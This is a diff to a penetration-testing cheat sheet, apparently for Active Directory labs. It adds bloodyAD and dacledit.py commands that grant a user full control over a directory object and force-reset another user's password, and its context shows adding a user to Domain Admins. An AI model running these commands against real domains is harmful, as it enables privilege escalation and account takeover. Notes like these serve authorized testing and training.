@@ -53,6 +53,16 @@ bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get object "
 ```
 ## AD Exploitation
 
+### Give user GenericAll over on object
+```bash
+python3 dacledit.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -action write -rights FullControl -principal $domainuser -target "target_object"
+bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" add genericAll "target_object" $domainuser
+```
+### Forcing user to change password
+```
+bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" set password "target_user" "Academy_P@ssw0rd123!"
+```
+
 ### Add user to group
 ```bash
 bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" add groupMember "Domain Admins" "john.doe"
